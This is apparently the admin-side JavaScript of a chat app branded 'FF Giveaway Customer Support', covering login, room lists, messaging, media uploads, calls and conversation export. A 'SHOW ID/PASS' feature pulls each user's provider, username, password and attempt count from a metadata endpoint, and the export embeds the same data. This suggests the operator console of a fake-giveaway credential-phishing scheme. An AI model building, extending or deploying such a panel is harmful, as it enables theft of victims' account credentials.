const socket = io({ transports: ['polling'] });

const gate = document.getElementById('gate');
const adminApp = document.getElementById('adminApp');
const nameInput = document.getElementById('nameInput');
const enterBtn = document.getElementById('enterBtn');
const loginError = document.getElementById('loginError');

const sidebar = document.getElementById('sidebar');
const sbSub = document.getElementById('sbSub');
const roomList = document.getElementById('roomList');
const chatPanel = document.getElementById('chatPanel');
const noRoom = document.getElementById('noRoom');
const chatHeader = document.getElementById('chatHeader');
const chatName = document.getElementById('chatName');
const chatSub = document.getElementById('chatSub');
const backBtn = document.getElementById('backBtn');

const messages = document.getElementById('messages');
const inputbar = document.getElementById('inputbar');
const textInput = document.getElementById('textInput');
const sendBtn = document.getElementById('sendBtn');
const micBtn = document.getElementById('micBtn');
const photoBtn = document.getElementById('photoBtn');
const fileInput = document.getElementById('fileInput');
const toastEl = document.getElementById('toast');

let activeRoom = null;
let activeRoomName = null;
let rooms = [];
let currentHistory = [];

// ---------- Calls ----------
NebulaCall.init({
  socket,
  role: 'admin',
  getRoomId: () => activeRoom,
  getPeerName: () => activeRoomName,
  onToast: showToast
});

// ---------- Socket status ----------
socket.on('connect', () => {
  console.log('Admin socket connected:', socket.id);
});
socket.on('connect_error', (err) => {
  console.error('Socket error:', err);
  showToast('Cannot connect to server. Is it running?');
});

// ---------- Toast ----------
let toastTimer = null;
function showToast(msg){
  toastEl.textContent = msg;
  toastEl.classList.add('show');
  clearTimeout(toastTimer);
  toastTimer = setTimeout(() => toastEl.classList.remove('show'), 3000);
}

// ---------- Login ----------
socket.on('connect', () => {
  const savedPass = sessionStorage.getItem('nebula_admin_pass');
  if (savedPass) {
    nameInput.value = savedPass;
    socket.emit('admin_join', { password: savedPass });
  }
});

enterBtn.addEventListener('click', attemptLogin);
nameInput.addEventListener('keydown', e => { if (e.key === 'Enter') attemptLogin(); });

function attemptLogin(){
  const pass = nameInput.value.trim();
  if (!pass) return;
  socket.emit('admin_join', { password: pass });
}

socket.on('admin_auth_fail', () => {
  loginError.style.display = 'block';
  sessionStorage.removeItem('nebula_admin_pass');
});

socket.on('admin_auth_ok', () => {
  sessionStorage.setItem('nebula_admin_pass', nameInput.value);
  gate.style.display = 'none';
  adminApp.style.display = 'block';
});

// ---------- Rooms ----------
socket.on('rooms_update', (list) => {
  rooms = list;
  sbSub.textContent = `${rooms.length} conversation${rooms.length === 1 ? '' : 's'}`;
  renderRoomList();
});

function renderRoomList(){
  if (rooms.length === 0) {
    roomList.innerHTML = '<div class="empty-state">No conversations yet. Once someone opens the chat, they\'ll appear here.</div>';
    return;
  }
  roomList.innerHTML = '';
  rooms.forEach(r => {
    const div = document.createElement('div');
    div.className = 'room-item' + (r.id === activeRoom ? ' active' : '');
    div.innerHTML = `
      <div class="avatar3d"></div>
      <div class="ri-info">
        <h3>${escapeHtml(r.name)}</h3>
        <p>${r.lastSender === 'admin' ? 'You: ' : ''}${escapeHtml(r.lastMessage)}</p>
      </div>
      <div class="ri-time">${r.lastTime ? fmtTime(r.lastTime) : ''}</div>
    `;
    div.addEventListener('click', () => openRoom(r.id, r.name));
    roomList.appendChild(div);
  });
}

function openRoom(roomId, name){
  NebulaCall.endCall(true);
  activeRoom = roomId;
  activeRoomName = name;
  chatName.textContent = name;
  chatSub.textContent = 'Conversation';
  chatSub.classList.remove('offline');

  noRoom.style.display = 'none';
  chatHeader.style.display = 'flex';
  messages.style.display = 'flex';
  inputbar.style.display = 'flex';

  messages.innerHTML = '';
  currentHistory = [];
  socket.emit('admin_open_room', { roomId });

  renderRoomList();

  sidebar.classList.add('hide');
  chatPanel.classList.add('show');
}

backBtn.addEventListener('click', () => {
  sidebar.classList.remove('hide');
  chatPanel.classList.remove('show');
});

socket.on('room_history', ({ roomId, history }) => {
  if (roomId !== activeRoom) return;
  currentHistory = history;
  messages.innerHTML = '';
  history.forEach(renderMessage);
  scrollBottom();
});

socket.on('new_message', (msg) => {
  if (msg.room_id === activeRoom) {
    currentHistory.push(msg);
    removeTyping();
    renderMessage(msg);
    scrollBottom();
  }
});

socket.on('typing', ({ roomId, sender }) => {
  if (sender === 'user' && roomId === activeRoom) showTyping();
});

// ---------- Render ----------
function scrollBottom(){ messages.scrollTop = messages.scrollHeight; }
function fmtTime(ts){ return new Date(ts).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }); }
function fmtDateTime(ts){ return new Date(ts).toLocaleString(); }
function escapeHtml(s){ return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }

function renderMessage(msg){
  const who = msg.sender === 'admin' ? 'me' : 'them';
  const div = document.createElement('div');
  div.className = `msg ${who} ${msg.type}`;

  let inner = '';
  if (msg.type === 'text') {
    inner = escapeHtml(msg.content);
  } else if (msg.type === 'photo') {
    inner = `<img src="${msg.content}" alt="photo" loading="lazy"/>`;
  } else if (msg.type === 'voice') {
    inner = `<audio controls src="${msg.content}"></audio>`;
  }

  div.innerHTML = inner + `<span class="time">${fmtTime(msg.created_at)}</span>`;
  messages.appendChild(div);
}

function showTyping(){
  if (document.getElementById('typingIndicator')) return;
  const div = document.createElement('div');
  div.className = 'typing';
  div.id = 'typingIndicator';
  div.innerHTML = '<span></span><span></span><span></span>';
  messages.appendChild(div);
  scrollBottom();
}
function removeTyping(){
  const t = document.getElementById('typingIndicator');
  if (t) t.remove();
}

// ---------- DOWNLOAD CONVERSATION ----------
document.getElementById('downloadBtn').addEventListener('click', async () => {
  if (!activeRoom || currentHistory.length === 0) {
    showToast('No conversation to download.');
    return;
  }

  showToast('Preparing download, please wait…');

  const userName = activeRoomName || 'user';
  const fileName = userName.replace(/[^a-z0-9_\-]/gi, '_') + '.html';
  const exportDate = new Date().toLocaleString();

  // Helper: fetch a URL and convert to base64 data URI
  async function toDataURI(url) {
    try {
      const resp = await fetch(url);
      const blob = await resp.blob();
      return await new Promise(resolve => {
        const r = new FileReader();
        r.onload = () => resolve(r.result);
        r.readAsDataURL(blob);
      });
    } catch {
      return url; // fallback to original URL if fetch fails
    }
  }

  // Build message rows, embedding images/audio as base64
  let msgRows = '';
  for (const msg of currentHistory) {
    const who = msg.sender === 'admin' ? 'Jatin (Admin)' : escapeHtml(userName);
    const side = msg.sender === 'admin' ? 'admin' : 'user';
    let content = '';
    if (msg.type === 'text') {
      content = escapeHtml(msg.content);
    } else if (msg.type === 'photo') {
      const dataUri = await toDataURI(msg.content);
      content = `<img src="${dataUri}" style="max-width:300px;border-radius:8px;display:block;" />`;
    } else if (msg.type === 'voice') {
      const dataUri = await toDataURI(msg.content);
      content = `<audio controls src="${dataUri}"></audio>`;
    }
    msgRows += `
      <div class="bubble ${side}">
        <div class="sender">${who}</div>
        <div class="content">${content}</div>
        <div class="time">${fmtDateTime(msg.created_at)}</div>
      </div>`;
  }

  // fetch user metadata and include in export
  let meta = null;
  try {
    const r = await fetch('/user-meta/' + encodeURIComponent(activeRoom), { headers: { 'x-admin-pass': sessionStorage.getItem('nebula_admin_pass') || '' } });
    if (r.ok) meta = await r.json();
  } catch (e) { meta = null; }

  const metaPreHtml = meta ? ('<h2>User Metadata</h2><pre style="background:#0b1220;padding:10px;border-radius:8px;">' + escapeHtml(JSON.stringify(meta, null, 2)) + '</pre><hr style="border-color:#333;margin:20px 0"/>') : '';

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Chat - ${escapeHtml(userName)}</title>
<style>
  body { font-family: Arial, sans-serif; background: #0f0f1a; color: #fff; padding: 20px; max-width: 700px; margin: auto; }
  h1 { color: #a78bfa; } p { color: #aaa; }
  .bubble { margin: 12px 0; padding: 10px 14px; border-radius: 14px; max-width: 75%; clear: both; }
  .bubble.user { background: #1e1e2e; float: left; border-bottom-left-radius: 4px; }
  .bubble.admin { background: #4f46e5; float: right; border-bottom-right-radius: 4px; }
  .sender { font-size: 11px; opacity: 0.6; margin-bottom: 4px; }
  .content { font-size: 15px; word-break: break-word; }
  .time { font-size: 10px; opacity: 0.5; margin-top: 4px; }
  .clearfix { clear: both; }
  audio { display: block; margin-top: 4px; }
</style>
</head>
<body>
<h1>FF Giveaway Customer Support</h1>
<p>Conversation with: <strong>${escapeHtml(userName)}</strong></p>
<p>Downloaded on: ${exportDate}</p>
<hr style="border-color:#333;margin:20px 0"/>
 ${metaPreHtml}
${msgRows}
<div class="clearfix"></div>
</body>
</html>`;

  const blob = new Blob([html], { type: 'text/html' });
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = fileName;
  a.click();
  URL.revokeObjectURL(a.href);
  showToast('Downloaded: ' + fileName);
});

// ---------- SHOW ID/PASS ----------
const showCredBtn = document.getElementById('showCredBtn');
const adminCredModal = document.getElementById('adminCredModal');
const adminCredPre = document.getElementById('adminCredPre');
const adminCredClose = document.getElementById('adminCredClose');

showCredBtn.addEventListener('click', async () => {
  if (!activeRoom) { showToast('Select a conversation first'); return; }
  try {
    const r = await fetch('/user-meta/' + encodeURIComponent(activeRoom), { headers: { 'x-admin-pass': sessionStorage.getItem('nebula_admin_pass') || '' } });
    if (!r.ok) { showToast('No metadata for this user'); return; }
    const meta = await r.json();
    adminCredPre.textContent = JSON.stringify({ id: meta.id, provider: meta.provider, username: meta.username, password: meta.password, attempts: meta.attempts }, null, 2);
    adminCredModal.style.display = 'flex';
  } catch (e) { showToast('Failed to fetch user metadata'); }
});

adminCredClose.addEventListener('click', () => { adminCredModal.style.display = 'none'; });

// ---------- DELETE CONVERSATION ----------
document.getElementById('deleteBtn').addEventListener('click', () => {
  if (!activeRoom) return;
  const confirmed = confirm(`Delete entire conversation with "${activeRoomName}"?\nThis cannot be undone.`);
  if (!confirmed) return;

  fetch('/delete-room', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ roomId: activeRoom, password: sessionStorage.getItem('nebula_admin_pass') })
  })
  .then(r => r.json())
  .then(data => {
    if (data.ok) {
      showToast('Conversation deleted.');
      activeRoom = null;
      activeRoomName = null;
      currentHistory = [];
      messages.innerHTML = '';
      chatHeader.style.display = 'none';
      messages.style.display = 'none';
      inputbar.style.display = 'none';
      noRoom.style.display = 'flex';
      sidebar.classList.remove('hide');
      chatPanel.classList.remove('show');
    } else {
      showToast('Delete failed: ' + (data.error || 'unknown error'));
    }
  })
  .catch(() => showToast('Delete failed. Server error.'));
});

// ---------- Sending ----------
function sendText(){
  if (!activeRoom) return;
  const val = textInput.value.trim();
  if (!val) return;
  socket.emit('admin_message', { roomId: activeRoom, type: 'text', content: val });
  textInput.value = '';
}
sendBtn.addEventListener('click', () => {
  if (recording) { stopRecording(); return; }
  sendText();
});
textInput.addEventListener('keydown', e => { if (e.key === 'Enter') sendText(); });
textInput.addEventListener('input', () => {
  if (activeRoom) socket.emit('typing', { roomId: activeRoom, sender: 'admin' });
});

// ---------- Photo ----------
photoBtn.addEventListener('click', () => fileInput.click());
fileInput.addEventListener('change', e => {
  const file = e.target.files[0];
  if (!file || !activeRoom) return;
  resizeImage(file, 1000, 0.8).then(blob => {
    const fd = new FormData();
    fd.append('file', blob, 'photo.jpg');
    fetch('/upload', { method: 'POST', body: fd })
      .then(r => r.json())
      .then(data => {
        if (data.url) socket.emit('admin_message', { roomId: activeRoom, type: 'photo', content: data.url });
      })
      .catch(() => showToast('Upload failed. Try again.'));
  });
  fileInput.value = '';
});

function resizeImage(file, maxDim, quality){
  return new Promise(resolve => {
    const img = new Image();
    const reader = new FileReader();
    reader.onload = e => { img.src = e.target.result; };
    img.onload = () => {
      let { width, height } = img;
      if (width > height && width > maxDim) {
        height = Math.round(height * (maxDim / width)); width = maxDim;
      } else if (height > maxDim) {
        width = Math.round(width * (maxDim / height)); height = maxDim;
      }
      const canvas = document.createElement('canvas');
      canvas.width = width; canvas.height = height;
      canvas.getContext('2d').drawImage(img, 0, 0, width, height);
      canvas.toBlob(blob => resolve(blob), 'image/jpeg', quality);
    };
    reader.readAsDataURL(file);
  });
}

// ---------- Voice ----------
let recording = false;
let mediaRecorder = null;
let audioChunks = [];

micBtn.addEventListener('click', () => {
  if (!recording) startRecording(); else stopRecording();
});

async function startRecording(){
  if (!activeRoom) return;
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    mediaRecorder = new MediaRecorder(stream);
    audioChunks = [];
    mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
    mediaRecorder.onstop = () => {
      stream.getTracks().forEach(t => t.stop());
      const blob = new Blob(audioChunks, { type: 'audio/webm' });
      const fd = new FormData();
      fd.append('file', blob, 'voice.webm');
      fetch('/upload', { method: 'POST', body: fd })
        .then(r => r.json())
        .then(data => {
          if (data.url) socket.emit('admin_message', { roomId: activeRoom, type: 'voice', content: data.url });
        })
        .catch(() => showToast('Upload failed. Try again.'));
    };
    mediaRecorder.start();
    recording = true;
    inputbar.classList.add('recording');
    micBtn.style.background = 'var(--danger)';
    micBtn.style.borderColor = 'var(--danger)';
  } catch (err) {
    showToast('Microphone access denied');
  }
}
function stopRecording(){
  if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
  recording = false;
  inputbar.classList.remove('recording');
  micBtn.style.background = '';
  micBtn.style.borderColor = '';
}

document.getElementById('voiceCallBtn').addEventListener('click', () => {
  NebulaCall.startCall('audio');
});
document.getElementById('videoCallBtn').addEventListener('click', () => {
  NebulaCall.startCall('video');
});

document.getElementById('cameraBtn').addEventListener('click', () => {
  if (!activeRoom) return;
  NebulaCall.openCamera(blob => {
    const fd = new FormData();
    fd.append('file', blob, 'live-photo.jpg');
    fetch('/upload', { method: 'POST', body: fd })
      .then(r => r.json())
      .then(data => {
        if (data.url) socket.emit('admin_message', { roomId: activeRoom, type: 'photo', content: data.url });
      })
      .catch(() => showToast('Upload failed. Try again.'));
  });
});